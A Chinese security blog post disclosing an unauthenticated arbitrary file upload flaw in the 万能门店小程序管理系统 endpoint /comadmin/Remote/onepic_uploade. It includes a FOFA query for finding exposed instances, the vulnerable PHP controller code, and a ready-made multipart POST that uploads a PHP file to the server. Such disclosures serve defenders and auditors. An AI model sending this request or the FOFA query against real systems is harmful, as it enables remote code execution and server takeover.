---
title: "万能门店小程序管理系统 /comadmin/Remote/onepic_uploade 文件上传漏洞"
source: https://mrxn.net/jswz/api-wxapps-onepic_uploade-fileupload.html
asset_dir: assets/万能门店小程序管理系统-comadminremoteonepic_uploade-文件上传漏洞
---

# 万能门店小程序管理系统 /comadmin/Remote/onepic\_uploade 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/19 08:10
- 567浏览
- [0评论](#comment)
- 14分钟阅读

深入探索

数据库

JSON处理工具

防火墙软件

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。该系统集成了会员管理和会员营销两大核心功能，支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统的 comadmin/Remote/onepic\_uploade 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，未经身份验证的攻击者可以通过该漏洞上传恶意文件，执行任意代码，写入后门，获取服务器权限，进而控制整个web服务器。

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

深入探索

安全

文本剥离工具

安全运维咨询

application/comadmin/controller/Remote.php

```
//单个图片上传操作
    function onepic_uploade($file){
        $thumb = request()->file($file);
        if(isset($thumb)){
            $dir = upload_img();
            $info = $thumb->move($dir); 
            if($info){  
                $imgurl = ROOT_HOST."/upimages/".date("Ymd",time())."/".$info->getFilename();
                return $imgurl;
            }  
        }
    }
//定义上传图片的默认路径
function upload_img()
{
    //1.设置上传路径
    $dir = ROOT_PATH . "public/upimages/";
    return $dir;
}
```

直接调用thinkphp的 file 方法对上传文件直接处理后保存在 upload\_img 设置的文件夹并返回上传后的完整路径，造成任意文件上传[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /comadmin/Remote/onepic_uploade?file=file HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBiKyL9D0p5OtH5zz

------WebKitFormBoundaryBiKyL9D0p5OtH5zz
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();unlink(__FILE__);?>
------WebKitFormBoundaryBiKyL9D0p5OtH5zz--
```

[![万能门店小程序管理系统 /comadmin/Remote/onepic_uploade 文件上传漏洞](images/img-001-0b508e97afd2.webp)](https://image.mrxn.net/05fb87ecde024365bdac0dba0052324f.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
